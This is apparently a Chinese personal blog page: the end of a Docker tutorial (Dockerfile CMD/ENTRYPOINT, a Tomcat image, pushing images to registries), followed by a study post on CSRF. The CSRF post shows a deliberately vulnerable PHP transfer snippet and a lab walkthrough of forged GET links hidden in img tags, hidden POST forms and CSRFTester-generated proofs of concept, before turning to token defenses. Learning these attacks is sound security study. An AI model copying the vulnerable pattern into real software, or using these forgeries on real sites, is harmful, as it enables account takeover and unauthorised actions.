<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编写dockerfile 文件</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it mycmd</span><br><span class="line">/bin/sh: [ls.-a]: command not found</span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# vi cmd </span><br><span class="line">FROM centos</span><br><span class="line">CMD ["ls","-a"]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构建镜像</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker build -f cmd -t mycmd .</span><br><span class="line"></span><br><span class="line">Sending build context to Docker daemon  3.072kB</span><br><span class="line">Step 1/2 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 831691599b88</span></span><br><span class="line">Step 2/2 : CMD ["ls","-a"]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> d8930564e002</span></span><br><span class="line">Removing intermediate container d8930564e002</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> deb7bf9eca04</span></span><br><span class="line">Successfully built deb7bf9eca04</span><br><span class="line">Successfully tagged mycmd:latest</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> run运行，发现我们的ls -a命令生效</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it mycmd</span><br><span class="line">.   .dockerenv  dev  home  lib64       media  opt   root  sbin  sys  usr</span><br><span class="line">..  bin         etc  lib   lost+found  mnt    proc  run   srv   tmp  var</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 我们想要追加一个命令 -l 	la-al</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it deb7bf9eca04 -l</span><br><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:349: starting container process caused "exec: \"-l\": executable file not found in $PATH": unknown.</span><br><span class="line">ERRO[0000] error waiting for container: context canceled </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> cmd的情况下 -l 替换么CMD [<span class="string">"ls"</span>,<span class="string">"-a"</span>]命令，-l 不是命令所以报错</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将格式后面加上 ls -al才能执行，</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it deb7bf9eca04 ls -al</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:03 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:03 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Jul 12 15:03 .dockerenv</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 11  2019 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   5 root root  360 Jul 12 15:03 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:03 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 11  2019 home</span><br></pre></td></tr></table></figure>

<p>测试ENTRYPOINT</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编写一个Entrypoint的dockerfile文件</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# vi entrypoint</span><br><span class="line">FROM centos</span><br><span class="line">ENTRYPOINT ["ls","-a"]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构建镜像</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker build -f entrypoint -t myentrypoint .</span><br><span class="line">Sending build context to Docker daemon  4.096kB</span><br><span class="line">Step 1/2 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 831691599b88</span></span><br><span class="line">Step 2/2 : ENTRYPOINT ["ls","-a"]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 68d1dab6df2f</span></span><br><span class="line">Removing intermediate container 68d1dab6df2f</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 4a4072bdbcc6</span></span><br><span class="line">Successfully built 4a4072bdbcc6</span><br><span class="line">Successfully tagged myentrypoint:latest</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行镜像</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it 4a4072bdbcc6</span><br><span class="line">.   .dockerenv  dev  home  lib64       media  opt   root  sbin  sys  usr</span><br><span class="line">..  bin         etc  lib   lost+found  mnt    proc  run   srv   tmp  var</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 加上参数，发现直接运行了，说明参数追加了，并不是像CMD一样报错</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it 4a4072bdbcc6 -l</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:06 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:06 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Jul 12 15:06 .dockerenv</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 11  2019 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   5 root root  360 Jul 12 15:06 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:06 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 11  2019 home</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="实战：tomcat镜像"><a href="#实战：tomcat镜像" class="headerlink" title="实战：tomcat镜像"></a>实战：tomcat镜像</h5><p>1、准备镜像文件 tomcat 压缩包，jdk的压缩包！</p>
<p>百度搜索下载就行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713141438888.png" alt="image-20200713141438888"></p>
<p>2、编写dockerfile文件，官方命名<code>Dockerfile</code>，build会自动寻找这个文件，就不需要-f指定了！</p>
<p>新建一个readme.txt，在vim Dockerfile</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">MAINTAINER long&lt;1927353788@qq.com</span><br><span class="line"></span><br><span class="line">COPY readme.txt /usr/local/readme.txt</span><br><span class="line"></span><br><span class="line">ADD jdk-8u60-linux-x64.tar.gz /usr/local/</span><br><span class="line">ADD apache-tomcat-9.0.37.tar.gz /usr/local/</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> java安装目录</span></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_60</span><br><span class="line">ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"><span class="meta">#</span><span class="bash"> tomcat默认目录</span></span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.37</span><br><span class="line">ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.37</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.37/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.37/bin/logs/catalina.out</span><br></pre></td></tr></table></figure>

<p>3、构建镜像</p>
<p>因为Dockerfile名字是官方名字，所以我们不需要写-f了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker build -t diytomcat .</span></span><br></pre></td></tr></table></figure>

<p>4、启动镜像</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/tomcat# docker run -d -p 9090:8080 --name longtomcat -v /home/tomcat/test:/usr/local/apache-tomcat-9.0.37/webapps/test -v /home/tomcat/tomcatlogs/:/usr/local/apache-tomcat-9.0.37/logs diytomcat</span><br></pre></td></tr></table></figure>

<p>使用命令<code>curl localhost:9090</code>测试看看是否能返回源码，如果返回说明成功</p>
<p>5、访问测试</p>
<p>直接在页面输入公网地址测试/test/，因为我们之前是配置的test </p>
<p>6、发布项目（由于做了卷挂载，我们直接在本地编写项目皆可以）</p>
<p>xml</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">  &lt;web-app xmlns="http://java.sun.com/xml/ns/javaee"</span><br><span class="line">           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">           xsi:schemaLocation="http://java.sun.com/xml/ns/javaee</span><br><span class="line">                               http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span><br><span class="line">           version="2.5"&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/web-app&gt;</span><br></pre></td></tr></table></figure>

<p>jsp</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page language="java" contentType="text/html; charset=UTF-8"</span><br><span class="line">    pageEncoding="UTF-8"%&gt;</span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">            &lt;head&gt;</span><br><span class="line">                    &lt;meta charset="utf-8"&gt;</span><br><span class="line">                    &lt;title&gt;hello,long &lt;/title&gt;</span><br><span class="line">            &lt;/head&gt;</span><br><span class="line">            &lt;body&gt;</span><br><span class="line">                    Hello World!&lt;br/&gt;</span><br><span class="line">                    &lt;%</span><br><span class="line">                    System.out.println("---- my test web logs ----");</span><br><span class="line">                    %&gt;</span><br><span class="line">                    &lt;/body&gt;</span><br><span class="line">            &lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>发现：项目部署成功，可以直接访问ok</p>
<h4 id="发布镜像"><a href="#发布镜像" class="headerlink" title="发布镜像"></a>发布镜像</h4><blockquote>
<p>Docker Hub</p>
</blockquote>
<p>1、地址：<a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a>   注册自己的账号</p>
<p>2、确定账号可以登录</p>
<p>3、在我们服务器上提交自己的镜像</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker login --help</span><br><span class="line"></span><br><span class="line">Usage:  docker login [OPTIONS] [SERVER]</span><br><span class="line"></span><br><span class="line">Log in to a Docker registry.</span><br><span class="line">If no server is specified, the default is defined by the daemon.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -p, --password string   Password</span><br><span class="line">      --password-stdin    Take the password from stdin</span><br><span class="line">  -u, --username string   Username</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker login -u t4rb</span><br><span class="line">Password: </span><br><span class="line">WARNING! Your password will be stored unencrypted in /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/#credentials-store</span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure>

<p>4、登陆完毕后就可以提交镜像了。使用<code>docker push</code>命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> push自己的镜像到服务器上，TAG是latest使用docker tag进行更改</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker push diytomcat</span><br><span class="line">The push refers to repository [docker.io/library/diytomcat]</span><br><span class="line">8224c93eb99b: Preparing </span><br><span class="line">d84326805ba8: Preparing </span><br><span class="line">bb62c18f4698: Preparing </span><br><span class="line">661cc4178d6d: Preparing </span><br><span class="line">e1c4fa244dba: Preparing </span><br><span class="line">eb29745b8228: Waiting </span><br><span class="line">denied: requested access to the resource is denied  #被拒绝了</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> push镜像问题，这是因为该镜像的TAG是latest</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker push t4rb/diytomcat:2.0</span><br><span class="line">The push refers to repository [docker.io/t4rb/diytomcat]</span><br><span class="line">An image does not exist locally with the tag: t4rb/diytomcat</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更改完可以看到多了一个镜像，并且TAG变成了1.0</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">diytomcat            latest              ee410e9aa82d        4 hours ago         676MB</span><br><span class="line">t4rb/tomcat          1.0                 ee410e9aa82d        4 hours ago         676MB</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更改完成再次进行push，这样就可以成功提交了</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker push t4rb/tomcat</span><br><span class="line">The push refers to repository [docker.io/t4rb/tomcat]</span><br><span class="line">8224c93eb99b: Pushing  1.212MB/22.76MB</span><br><span class="line">d84326805ba8: Pushing  1.664MB/57.2MB</span><br><span class="line">bb62c18f4698: Pushing  703.5kB/15.63MB</span><br><span class="line">661cc4178d6d: Pushing  1.077MB/364.8MB</span><br><span class="line">e1c4fa244dba: Pushed </span><br><span class="line">eb29745b8228: Pushing  544.8kB/215.3MB</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713192056253.png" alt="image-20200713192056253"></p>
<p>提交的时候也是按照层级来提交的</p>
<blockquote>
<p>Docker 发布到阿里云服务上</p>
</blockquote>
<p>1、登录阿里云</p>
<p>2、找到容器镜像服务</p>
<p>3、点击容器仓库，创建命名空间</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713192809151.png" alt="image-20200713192809151"></p>
<p>4、创建容器镜像</p>
<p>要选择本地</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713193008683.png" alt="image-20200713193008683"></p>
<p>5、浏览阿里云</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713193352652.png" alt="image-20200713193352652"></p>
<h5 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713202200623.png" alt="image-20200713202200623"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-CSRF_SSRF" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/05/03/CSRF_SSRF/" class="article-date">
  	<time datetime="2020-05-03T07:59:26.635Z" itemprop="datePublished">2020-05-03</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2020/05/03/CSRF_SSRF/">
        CSRF_SSRF
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h4><h5 id="1、CSRF漏洞定义"><a href="#1、CSRF漏洞定义" class="headerlink" title="1、CSRF漏洞定义"></a>1、CSRF漏洞定义</h5><p>跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 <em>CSRF</em> 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上执行非本意的操作的攻击方法。</p>
<p>它与XSS非常不同，XSS是利用站点内的信任用户，而CSRF则通过伪装成信任用户请求受信任网站。与XSS相比，CSRF攻击往往不大流行(因此对其进行防御资源也相对较少)也难以防范，所以被认为比XSS更具危害性。</p>
<p>XSS与CSRF区别：</p>
<p>1、XSS利用站点内的信任用户，盗取cookie；</p>
<p>2、CSRF通过伪装成受信任用户请求信任的网站</p>
<h5 id="2、CSRF漏洞原理"><a href="#2、CSRF漏洞原理" class="headerlink" title="2、CSRF漏洞原理"></a>2、CSRF漏洞原理</h5><p>利用目标用户的合法身份，以目标用户的名义执行某些非法操作。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430105902911.png" alt="image-20200430105902911"></p>
<h5 id="3、CSRF漏洞代码分析"><a href="#3、CSRF漏洞代码分析" class="headerlink" title="3、CSRF漏洞代码分析"></a>3、CSRF漏洞代码分析</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	&#x2F;&#x2F; 会话验证</span><br><span class="line">	$user &#x3D; $_GET[&quot;user&quot;];</span><br><span class="line">	$money&#x3D;$_GET[&quot;money&quot;];</span><br><span class="line">	&#x2F;&#x2F; 转账操作</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430110119970.png" alt="image-20200430110119970"></p>
<h5 id="CSRF成功利用条件"><a href="#CSRF成功利用条件" class="headerlink" title="CSRF成功利用条件:"></a>CSRF成功利用条件:</h5><ul>
<li><h5 id="用户已经登陆系统"><a href="#用户已经登陆系统" class="headerlink" title="用户已经登陆系统"></a>用户已经登陆系统</h5></li>
<li><h5 id="用户访问对应URL"><a href="#用户访问对应URL" class="headerlink" title="用户访问对应URL"></a>用户访问对应URL</h5></li>
</ul>
<h5 id="4、CSRF漏洞利用"><a href="#4、CSRF漏洞利用" class="headerlink" title="4、CSRF漏洞利用"></a>4、CSRF漏洞利用</h5><p>先修改密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430113712776.png" alt="image-20200430113712776"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430113732750.png" alt="image-20200430113732750"></p>
<p>红线处是更改后的RUL，没有标记的URL是初始URL</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430113957981.png" alt="image-20200430113957981"></p>
<p>访问红线的URL，显示更改了密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430114113340.png" alt="image-20200430114113340"></p>
<p>尝试使用之前的hack登录，发现密码错误了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430114153110.png" alt="image-20200430114153110"></p>
<p>使用123登录尝试一下，发现成功登录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430114225884.png" alt="image-20200430114225884"></p>
<h4 id="无防护的CSRF"><a href="#无防护的CSRF" class="headerlink" title="无防护的CSRF"></a>无防护的CSRF</h4><h5 id="GET型CSRF利用"><a href="#GET型CSRF利用" class="headerlink" title="GET型CSRF利用"></a>GET型CSRF利用</h5><p>构造GET型URL，提交username和password参数，以此来新建对应的用户名和密码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430115745538.png" alt="image-20200430115745538"></p>
<p>隐蔽利用img标签的src属性</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430120228504.png" alt="image-20200430120228504"></p>
<p>打开这个URL，显示中奖了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430120436691.png" alt="image-20200430120436691"></p>
<p>在进行查看，成功添加进去了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430120502980.png" alt="image-20200430120502980"></p>
<h5 id="POST型CSRF利用"><a href="#POST型CSRF利用" class="headerlink" title="POST型CSRF利用"></a>POST型CSRF利用</h5><p>设置表单用于提交。例如：<code>&lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;111&quot;/&gt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430121112643.png" alt="image-20200430121112643"></p>
<p>打开url</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430121300333.png" alt="image-20200430121300333"></p>
<p>点击我要中奖了，进行跳转并成功输出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430121326257.png" alt="image-20200430121326257"></p>
<h4 id="CSRF漏洞自动化探测"><a href="#CSRF漏洞自动化探测" class="headerlink" title="CSRF漏洞自动化探测"></a>CSRF漏洞自动化探测</h4><h5 id="1、手动探测原理"><a href="#1、手动探测原理" class="headerlink" title="1、手动探测原理"></a>1、手动探测原理</h5><p>手动探测原理在于探测web应用程序具有防止CSRF的措施</p>
<p>防御措施</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430123124772.png" alt="image-20200430123124772"></p>
<p>如果web应用程序的HTTP请求中没有对应的预防措施，那么很大程度上就确定存在CSRF漏洞</p>
<p>手动修改需要修改很多东西。</p>
<h5 id="2、自动化探测工具介绍"><a href="#2、自动化探测工具介绍" class="headerlink" title="2、自动化探测工具介绍"></a>2、自动化探测工具介绍</h5><p>CSRFTester是一款CSRF漏洞测试工具</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430124537202.png" alt="image-20200430124537202"></p>
<h5 id="3、自动化探测工具使用"><a href="#3、自动化探测工具使用" class="headerlink" title="3、自动化探测工具使用"></a>3、自动化探测工具使用</h5><p>1、设置浏览器代理：127.0.0.1:8008</p>
<p>2、登录web应用程序，提交表单，在CSRF工具中修改表单内容，查看是否更改，如果更改表面存在CSRF漏洞</p>
<p>3、生产POC代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133051417.png" alt="image-20200430133051417"></p>
<p>点击截断</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133157442.png" alt="image-20200430133157442"></p>
<p>确定修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133223761.png" alt="image-20200430133223761"></p>
<p>抓取之后进行修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133324502.png" alt="image-20200430133324502"></p>
<p>点击右下角Generate HTML 另存为生成一个POC</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133452407.png" alt="image-20200430133452407"></p>
<p>打开index返回一个true</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133623220.png" alt="image-20200430133623220"></p>
<p>再回到会员页面，成功创建了一个新的会员，由此可以判断页面存在CSRF漏洞，并成功利用这个漏洞添加了用户名</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430133717157.png" alt="image-20200430133717157"></p>
<h5 id="4、利用CSRF漏洞"><a href="#4、利用CSRF漏洞" class="headerlink" title="4、利用CSRF漏洞"></a>4、利用CSRF漏洞</h5><p>使用服务器搭建CSRF POC访问页面</p>
<p>修改内容，上面还有一个地址也要修改</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430142101973.png" alt="image-20200430142101973"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430141949387.png" alt="image-20200430141949387"></p>
<p>点击登录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430145441936.png" alt="image-20200430145441936"></p>
<p>登录之后返回true</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430145512344.png" alt="image-20200430145512344"></p>
<p>查看会员列表</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430145532311.png" alt="image-20200430145532311"></p>
<p>如果再次重复提交的话，会报错</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430145600654.png" alt="image-20200430145600654"></p>
<h4 id="CSRF漏洞Token防御介绍"><a href="#CSRF漏洞Token防御介绍" class="headerlink" title="CSRF漏洞Token防御介绍"></a>CSRF漏洞Token防御介绍</h4><h5 id="1、漏洞修补逻辑分析"><a href="#1、漏洞修补逻辑分析" class="headerlink" title="1、漏洞修补逻辑分析"></a>1、漏洞修补逻辑分析</h5><p>CSRF漏洞实质：服务器无法准确判断当前请求是否是合法用户的自定义操作。</p>
<p>原因：用户登录之后服务器就会生成对应的cookie进行身份验证，验证之后就可以进行对应操作，而存在CSRF时用户在点击了构造的CSRF POC那么点击之后发送对应的请求到服务器，服务器接收到cookie（因为用户已经登录），cookie会随着请求一起发送到服务器，服务器确定了他是一个合法用户，但是并不能确定，它是用户自己操作还是用户点击了POC进行操作，而使得这种情况下就存在了CSRF漏洞</p>
<p>如果服务器在用户登录之后给予用户一个唯一合法令牌，每一次操作过程中，服务器都会验证令牌是否正确，如果正确那么执行操作。不正确不执行操作。</p>
<p>一般情况下，给予的令牌会写入表单中隐藏域的value值中，随着表单内容进行提交。</p>
<h5 id="2、简单代码模型分析"><a href="#2、简单代码模型分析" class="headerlink" title="2、简单代码模型分析"></a>2、简单代码模型分析</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200430150614027.png" alt="image-20200430150614027"></p>
<p>1、首先要有个登录界面login.php，登录成功执行操作，执行登录后的（增删改查）</p>
<p>这个过程中执行这些操作都需要提交对应身份验证的cookie值，有了cookie值才能进行操作，否则连第一步简单操作都无法进行</p>
<p>如果没有登录而直接执行对应的操作，这时候就会自动跳回到登录界面，或者给出其他的提示</p>
